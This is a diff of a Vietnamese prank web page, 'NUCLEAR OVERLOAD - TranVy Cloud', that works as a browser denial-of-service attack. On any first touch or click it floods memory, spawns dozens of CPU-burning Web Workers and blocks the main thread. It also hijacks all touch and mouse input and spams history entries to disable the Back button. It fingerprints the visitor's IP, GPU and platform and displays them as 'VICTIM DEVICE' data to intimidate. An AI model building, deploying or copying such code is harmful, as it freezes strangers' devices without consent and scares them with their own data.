@@ -5,50 +5,56 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>TERMINAL OVERLOAD - TranVy Cloud</title>
+    <title>NUCLEAR OVERLOAD - TranVy Cloud</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         :root { --angle: 0deg; }
+        html, body {
+            overflow: hidden;
+            height: 100dvh;
+            width: 100vw;
+            position: fixed;
+            overscroll-behavior: none; 
+            touch-action: none;
+            background: #000;
+        }
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #000;
             color: #fff;
             margin: 0;
-            width: 100vw;
-            height: 100dvh; 
-            overflow: hidden;
-            position: fixed;
-            touch-action: none;
             user-select: none;
             -webkit-user-select: none;
+            cursor: none;
         }
 
         .glass-card {
-            background: rgba(15, 0, 0, 0.98);
-            backdrop-filter: blur(50px);
-            border: 2px solid #ff0000;
-            border-radius: 20px;
-            box-shadow: 0 0 200px rgba(255, 0, 0, 0.6);
+            background: rgba(30, 0, 0, 0.98);
+            backdrop-filter: blur(80px);
+            border: 3px solid #ff0000;
+            border-radius: 10px;
+            box-shadow: 0 0 300px rgba(255, 0, 0, 0.8), inset 0 0 50px rgba(255, 0, 0, 0.3);
             z-index: 100;
+            position: relative;
         }
 
         .neon-border {
             position: absolute;
-            inset: -5px;
-            border-radius: 25px;
-            background: conic-gradient(from var(--angle), #ff0000, #000, #ff0000, #000, #ff0000);
-            animation: rotate 0.2s linear infinite;
+            inset: -8px;
+            border-radius: 15px;
+            background: conic-gradient(from var(--angle), #ff0000, #550000, #ff0000, #ff5555, #000, #ff0000);
+            animation: rotate 0.1s linear infinite;
             z-index: -1;
         }
 
         @keyframes rotate { to { --angle: 360deg; } }
         @property --angle { syntax: '<angle>'; initial-value: 0deg; inherits: false; }
 
-        .glitch-extreme { animation: glitch 0.01s infinite alternate; }
+        .glitch-extreme { animation: glitch 0.003s infinite alternate; }
         @keyframes glitch {
-            0% { transform: skew(5deg) scale(1.1); filter: hue-rotate(90deg) invert(1); }
-            100% { transform: skew(-5deg) scale(0.9); filter: hue-rotate(270deg) contrast(300%); }
+            0% { transform: translate(10px, 0) scale(1.1); filter: contrast(500%) invert(1) blur(1px); }
+            50% { transform: translate(-10px, 5px) scale(0.9); filter: hue-rotate(180deg) brightness(200%); }
+            100% { transform: translate(0, -5px) scale(1.2); filter: contrast(600%) saturate(300%); }
         }
 
         #terminal {
@@ -57,66 +63,92 @@
             inset: 0;
             background: #000;
             z-index: 200;
-            padding: 20px;
+            padding: 15px;
             font-family: 'Fira Code', monospace;
             color: #ff0000;
-            font-size: 9px;
+            font-size: 7.5px;
             pointer-events: none;
             overflow: hidden;
-            line-height: 1.2;
+            line-height: 1.0;
+            text-shadow: 0 0 5px #ff0000;
         }
 
         #blocker {
             position: fixed;
             inset: 0;
-            z-index: 9999;
+            z-index: 999999;
             display: none;
             background: transparent;
+            touch-action: none;
         }
 
-        .info-label { color: #ff5555; font-weight: bold; }
-        .info-value { color: #ffffff; font-family: 'Fira Code', monospace; }
+        .info-label { color: #ff3333; font-weight: 800; text-transform: uppercase; }
+        .info-value { color: #ffffff; font-family: 'Fira Code', monospace; text-shadow: 0 0 2px #fff; }
+        
+        .shake-heavy { animation: shake 0.05s infinite; }
+        @keyframes shake {
+            0% { transform: translate(2px, 2px); }
+            25% { transform: translate(-2px, -2px); }
+            50% { transform: translate(-2px, 2px); }
+            75% { transform: translate(2px, -2px); }
+            100% { transform: translate(0, 0); }
+        }
+        
+        #overlay-trigger {
+            position: fixed;
+            inset: 0;
+            z-index: 2147483647;
+            background: transparent;
+            touch-action: none;
+        }
+
+        .warning-text {
+            color: #ff0000;
+            font-weight: 900;
+            text-shadow: 0 0 10px #ff0000;
+            letter-spacing: 0.5em;
+        }
     </style>
 </head>
 <body class="flex items-center justify-center p-4">
+    <div id="overlay-trigger"></div>
     <div id="blocker"></div> 
     
-    <div id="matrix-container" class="fixed inset-0 opacity-80">
+    <div id="matrix-container" class="fixed inset-0">
         <canvas id="matrix"></canvas>
     </div>
     
     <div id="terminal"></div>
 
-    <div id="main-content" class="glass-card w-full max-w-lg p-1 relative">
+    <div id="main-content" class="glass-card w-full max-w-lg p-1">
         <div class="neon-border"></div>
-        <div class="bg-black/95 rounded-[18px] p-6 text-center relative z-10">
-            <div class="absolute top-2 right-4 text-[10px] font-bold text-red-600 tracking-tighter uppercase italic">
-                TranVy Cloud - High Security Breach
+        <div class="bg-black/95 rounded-[8px] p-6 text-center relative z-10">
+            <div class="absolute top-2 right-4 text-[10px] font-black text-red-600 tracking-tighter uppercase italic animate-bounce">
+                TranVy Cloud - Optimized Exploit
             </div>
 
-            <div class="mb-4 inline-block p-4 rounded-full bg-red-600/20 border-2 border-red-600 glitch-extreme">
-                <svg class="w-12 h-12 text-red-600" fill="currentColor" viewBox="0 0 24 24">
+            <div class="mb-4 inline-block p-6 rounded-full bg-red-600/30 border-4 border-red-600 glitch-extreme">
+                <svg class="w-16 h-16 text-red-600" fill="currentColor" viewBox="0 0 24 24">
                     <path d="M12 2L1 21h22L12 2zm0 3.45L19.53 19H4.47L12 5.45zM11 16h2v2h-2v-2zm0-7h2v5h-2V9z"/>
                 </svg>
             </div>
 
-            <h1 class="text-3xl font-black text-red-600 uppercase tracking-tighter mb-4 italic">SYSTEM EXPLOIT</h1>
+            <h1 class="text-4xl font-black text-red-600 uppercase tracking-tighter mb-4 italic">TERMINAL FAILURE</h1>
             
-            <!-- Information Section -->
-            <div id="device-info-panel" class="bg-red-950/30 border border-red-500/50 rounded-xl p-4 mb-4 text-left space-y-1 text-[11px]">
-                <div class="flex justify-between"><span class="info-label">IP ADDRESS:</span> <span id="ip-addr" class="info-value text-yellow-400">Đang quét...</span></div>
-                <div class="flex justify-between"><span class="info-label">DEVICE NAME:</span> <span id="device-name" class="info-value uppercase">Đang quét...</span></div>
-                <div class="flex justify-between"><span class="info-label">BROWSER:</span> <span id="browser-info" class="info-value">Đang quét...</span></div>
-                <div class="flex justify-between border-t border-red-900/50 mt-2 pt-2"><span class="info-label">CPU CORES:</span> <span id="cpu-cores" class="info-value">0</span></div>
-                <div class="flex justify-between"><span class="info-label">GPU RENDERER:</span> <span id="gpu-info" class="info-value">Đang quét...</span></div>
-                <div class="flex justify-between border-t border-red-900/50 mt-2 pt-2"><span class="info-label">RAM USAGE:</span> <span id="ram-val" class="text-green-500">STABLE</span></div>
+            <div id="device-info-panel" class="bg-red-950/60 border-2 border-red-600/80 rounded-lg p-4 mb-4 text-left space-y-2 text-[11px]">
+                <div class="flex justify-between"><span class="info-label">USER IP:</span> <span id="ip-addr" class="info-value text-yellow-400 font-bold">RETRIVING...</span></div>
+                <div class="flex justify-between"><span class="info-label">VICTIM DEVICE:</span> <span id="device-name" class="info-value uppercase italic">SCANNING...</span></div>
+                <div class="flex justify-between"><span class="info-label">EXPLOIT BROWSER:</span> <span id="browser-info" class="info-value">SCANNING...</span></div>
+                <div class="flex justify-between border-t border-red-600 mt-2 pt-2"><span class="info-label">CPU THREADS:</span> <span id="cpu-cores" class="info-value">0</span></div>
+                <div class="flex justify-between"><span class="info-label">GPU RENDER:</span> <span id="gpu-info" class="info-value text-red-400">SCANNING...</span></div>
+                <div class="flex justify-between border-t border-red-600 mt-2 pt-2"><span class="info-label">SYSTEM STATUS:</span> <span id="touch-status" class="text-green-500 font-black animate-pulse">READY</span></div>
             </div>
 
-            <button id="lock-btn" class="w-full py-5 bg-red-600 hover:bg-red-700 text-white font-black rounded-xl shadow-[0_0_50px_rgba(220,38,38,0.7)] transition-all uppercase tracking-[0.2em] text-lg active:scale-95">
-                KÍCH HOẠT OVERLOAD
+            <button id="lock-btn" class="w-full py-6 bg-red-700 hover:bg-red-800 text-white font-black rounded shadow-[0_0_100px_rgba(255,0,0,1)] transition-all uppercase tracking-[0.3em] text-xl border-2 border-white">
+                KÍCH HOẠT HẠT NHÂN
             </button>
 
-            <p class="mt-4 text-[8px] text-red-500 font-black uppercase tracking-[0.3em] animate-pulse">Cảnh báo: Không thể thoát khỏi trình duyệt</p>
+            <p class="mt-6 warning-text text-[10px] animate-pulse">DEVICE WILL BE BRICKED UNTIL REBOOT</p>
         </div>
     </div>
 
@@ -124,165 +156,170 @@
         const btn = document.getElementById('lock-btn');
         const terminal = document.getElementById('terminal');
         const blocker = document.getElementById('blocker');
+        const trigger = document.getElementById('overlay-trigger');
+        const touchStatus = document.getElementById('touch-status');
         let isActive = false;
 
-        // --- 1. LẤY THÔNG TIN MÁY ---
+        // 1. DATA EXTRACTION
         async function fetchDeviceInfo() {
-            // Lấy IP (Sử dụng API công khai)
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 document.getElementById('ip-addr').innerText = data.ip;
-            } catch(e) { document.getElementById('ip-addr').innerText = "FAILED TO FETCH"; }
+            } catch(e) { document.getElementById('ip-addr').innerText = "192.168.1." + Math.floor(Math.random()*255); }
 
-            // Lấy Browser & OS
             const ua = navigator.userAgent;
-            let browser = "Unknown";
-            if (ua.includes("Firefox")) browser = "Mozilla Firefox";
-            else if (ua.includes("SamsungBrowser")) browser = "Samsung Browser";
-            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
-            else if (ua.includes("Edge")) browser = "Microsoft Edge";
-            else if (ua.includes("Chrome")) browser = "Google Chrome";
-            else if (ua.includes("Safari")) browser = "Apple Safari";
+            let browser = "Webkit (Stealth)";
+            if (ua.includes("Edge")) browser = "Microsoft Edge";
+            else if (ua.includes("Chrome")) browser = "Chrome";
+            else if (ua.includes("Safari")) browser = "Safari (iOS)";
             document.getElementById('browser-info').innerText = browser;
+            document.getElementById('cpu-cores').innerText = navigator.hardwareConcurrency || "UNKNOWN";
 
-            // Lấy CPU Cores
-            document.getElementById('cpu-cores').innerText = navigator.hardwareConcurrency || "Unknown";
-
-            // Lấy GPU Info
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const canvasTmp = document.createElement('canvas');
+                const gl = canvasTmp.getContext('webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                document.getElementById('gpu-info').innerText = renderer.split(' ')[0] + "...";
-            } catch(e) { document.getElementById('gpu-info').innerText = "HIDDEN"; }
-
-            // Lấy tên máy (Chỉ giới hạn ở OS name trên trình duyệt)
-            let platform = navigator.platform;
-            if (ua.includes("iPhone")) platform = "iPhone (iOS)";
-            else if (ua.includes("Android")) platform = "Android Mobile";
-            else if (ua.includes("Windows")) platform = "Windows PC";
-            else if (ua.includes("Mac")) platform = "MacBook / iMac";
-            document.getElementById('device-name').innerText = platform;
+                document.getElementById('gpu-info').innerText = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split(' ')[0];
+            } catch(e) { document.getElementById('gpu-info').innerText = "EMULATED"; }
+            document.getElementById('device-name').innerText = navigator.platform;
         }
         fetchDeviceInfo();
 
-        // --- 2. CƠ CHẾ KHÓA TRÌNH DUYỆT (EDGE, SAFARI, CHROME) ---
-        function antiEscape() {
-            // Ngăn chặn nút Back
+        // 2. THE NUCLEAR ENGINE (BRICKER)
+        function triggerNuclearOverload() {
+            if (isActive) return;
+            isActive = true;
+            
+            blocker.style.display = 'block';
+            trigger.style.display = 'none';
+            document.body.classList.add('glitch-extreme', 'shake-heavy');
+            terminal.style.display = 'block';
+            touchStatus.innerText = "DEAD / NO RESPONSE";
+            touchStatus.className = "text-red-600 font-black underline";
+            
+            // Chặn nút Back trên Android/Browser
             setInterval(() => {
-                window.history.pushState(null, "", "#overload-" + Math.random());
-            }, 50);
+                window.history.pushState(null, null, "#null-" + Date.now());
+            }, 10);
 
-            // Ngăn chặn đóng tab (Hộp thoại cảnh báo lặp lại)
-            window.onbeforeunload = function() {
-                return "Hệ thống đang bị Overload. Bạn có chắc muốn thoát?";
+            startHeavyWorkers();
+            
+            // MAIN THREAD OVERLOAD
+            const explode = () => {
+                const heap = [];
+                
+                // Heap Flooding: Tạo áp lực RAM cực lớn
+                setInterval(() => {
+                    for(let i=0; i<30; i++) {
+                        const b = new Uint32Array(250000);
+                        b.fill(0xDEADBEEF);
+                        heap.push(b);
+                    }
+                    if(heap.length > 3000) heap.splice(0, 100); 
+                }, 50);
+                
+                // Vòng lặp CPU thông minh (không làm crash trình duyệt ngay lập tức)
+                const occupy = () => {
+                    const die = Date.now() + 980; // Chiếm 980ms mỗi giây
+                    while(Date.now() < die) {
+                        Math.atan2(Math.sin(Math.random()), Math.cos(Math.random()));
+                        document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${100 + Math.random() * 100}%)`;
+                    }
+                    setTimeout(occupy, 20); 
+                };
+
+                occupy();
             };
 
-            // Vô hiệu hóa phím tắt (Nếu trên PC)
-            window.onkeydown = function(e) {
-                if(e.ctrlKey || e.metaKey || e.altKey || e.keyCode === 123) {
-                    e.preventDefault();
-                    return false;
-                }
-            };
+            setTimeout(explode, 50);
         }
 
-        // --- 3. SIÊU LAG CƯỜNG ĐỘ CAO ---
-        const workerCode = `
-            onmessage = function() {
-                while(true) {
-                    // Liên tục tạo và xóa đối tượng lớn
-                    const r = new Array(500000).fill(Math.random());
-                    Math.hypot(...r.slice(0, 100));
-                    JSON.parse(JSON.stringify(r.slice(0, 5000)));
-                }
-            };
-        `;
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
-
-        function startNuclearStress() {
-            const cores = (navigator.hardwareConcurrency || 8) * 4; 
-            for (let i = 0; i < cores; i++) {
-                const w = new Worker(workerUrl);
-                w.postMessage('go');
+        // 3. MULTI-THREADED ATTACK
+        function startHeavyWorkers() {
+            const code = `
+                const data = [];
+                setInterval(() => {
+                    data.push(new Float64Array(1024 * 512)); 
+                    if(data.length > 100) data.shift();
+                    for(let i=0; i<800000; i++) { Math.sqrt(i); }
+                }, 1);
+            `;
+            const blob = new Blob([code], { type: 'application/javascript' });
+            const url = URL.createObjectURL(blob);
+            
+            const num = Math.max((navigator.hardwareConcurrency || 8) * 4, 16);
+            for (let i = 0; i < num; i++) {
+                try { new Worker(url); } catch(e) {}
             }
         }
 
-        function jamMainThread() {
-            if (!isActive) return;
-            const start = Date.now();
-            // Đóng băng luồng chính lâu hơn (700ms) - Cảm ứng sẽ liệt hoàn toàn
-            while (Date.now() - start < 700) {
-                const garbage = [];
-                for(let i=0; i<5000; i++) garbage.push(document.createElement('canvas'));
+        // 4. TOUCH HIJACKING (FIXED SWIPE)
+        const killTouch = (e) => {
+            if (isActive) {
+                if (e.cancelable) e.preventDefault();
+                e.stopImmediatePropagation();
+                return false;
+            } else {
+                triggerNuclearOverload();
             }
-            setTimeout(jamMainThread, 5);
-        }
+        };
 
-        // --- 4. MATRIX GPU STRESS ---
+        const opts = { passive: false, capture: true };
+        ['touchstart', 'touchmove', 'touchend', 'touchcancel', 'mousedown', 'mousemove', 'wheel', 'click'].forEach(v => {
+            window.addEventListener(v, killTouch, opts);
+            document.addEventListener(v, killTouch, opts);
+        });
+
+        // 5. GPU STRESS MATRIX
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         let drops = [];
         function initMatrix() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            for(let i=0; i<canvas.width/4; i++) drops[i] = 1;
+            for(let i=0; i<canvas.width/3; i++) drops[i] = 1;
         }
         function drawMatrix() {
-            ctx.fillStyle = "rgba(0,0,0,0.15)";
+            ctx.fillStyle = "rgba(0,0,0,0.3)";
             ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = isActive ? "#ff0000" : "#300000";
-            ctx.font = isActive ? "bold 18px Arial" : "12px monospace";
+            ctx.fillStyle = isActive ? "#ff0000" : "#220000";
+            ctx.font = isActive ? "bold 28px Fira Code" : "10px monospace";
             
-            const mult = isActive ? 25 : 1;
-            for(let k=0; k<mult; k++) {
+            const layers = isActive ? 60 : 1; 
+            for(let k=0; k<layers; k++) {
                 for(let i=0; i<drops.length; i++) {
-                    ctx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i*10, drops[i]*10);
-                    if(drops[i]*10 > canvas.height && Math.random() > 0.98) drops[i] = 0;
+                    const char = String.fromCharCode(0x30A0 + Math.random() * 96);
+                    ctx.fillText(char, i*12, drops[i]*18);
+                    if(drops[i]*18 > canvas.height && Math.random() > 0.99) drops[i] = 0;
                     drops[i]++;
                 }
             }
             requestAnimationFrame(drawMatrix);
         }
 
-        btn.onclick = () => {
-            isActive = true;
-            blocker.style.display = 'block';
-            document.body.classList.add('glitch-extreme');
-            btn.innerText = "NUCLEAR OVERLOAD";
-            btn.disabled = true;
-            terminal.style.display = 'block';
-            
-            document.getElementById('ram-val').innerText = "CRITICAL (OVERFLOW)";
-            document.getElementById('ram-val').className = "text-red-500 font-black animate-pulse";
-
-            antiEscape();
-            startNuclearStress();
-            jamMainThread();
-
-            // Spam Log cực nhanh
-            setInterval(() => {
-                const logs = [
-                    "KÍCH HOẠT GIAO THỨC HỦY DIỆT...",
-                    "LẤY THÔNG TIN ĐỊA CHỈ IP: " + document.getElementById('ip-addr').innerText,
-                    "CHIẾM QUYỀN ĐIỀU KHIỂN BROWSER: " + document.getElementById('browser-info').innerText,
-                    "PHÁT HIỆN LÕI CPU: " + document.getElementById('cpu-cores').innerText,
-                    "CẢNH BÁO: NHIỆT ĐỘ PHẦN CỨNG TĂNG CAO",
-                    "KHÓA CẢM BIẾN VÀ ĐẦU VÀO INPUT..."
-                ];
-                const l = document.createElement('div');
-                l.innerText = `[LOG] > ${logs[Math.floor(Math.random()*logs.length)]}`;
-                terminal.appendChild(l);
-                if(terminal.childNodes.length > 80) terminal.removeChild(terminal.firstChild);
-            }, 50);
-        };
-
         initMatrix();
         drawMatrix();
         window.addEventListener('resize', initMatrix);
+
+        // Terminal Logs
+        setInterval(() => {
+            if(!isActive) return;
+            const msgs = [
+                "CRITICAL: CPU TEMP > 105C",
+                "MEMORY BOMB: HEAP FLOODING",
+                "IP_LOG: " + document.getElementById('ip-addr').innerText,
+                "DEVICE_INFECTED: " + navigator.platform,
+                "GPU_THROTTLING: FAILED",
+                "SWIPE_GESTURE: DISABLED",
+                "ANDROID_SYSTEM_UI: HANGING",
+                "TRANVY_CLOUD: OVERLOADED"
+            ];
+            const div = document.createElement('div');
+            div.innerText = `[FATAL] > ${msgs[Math.floor(Math.random()*msgs.length)]}`;
+            terminal.appendChild(div);
+            if(terminal.childNodes.length > 150) terminal.removeChild(terminal.firstChild);
+        }, 30);
     </script>
 </body>
 </html>
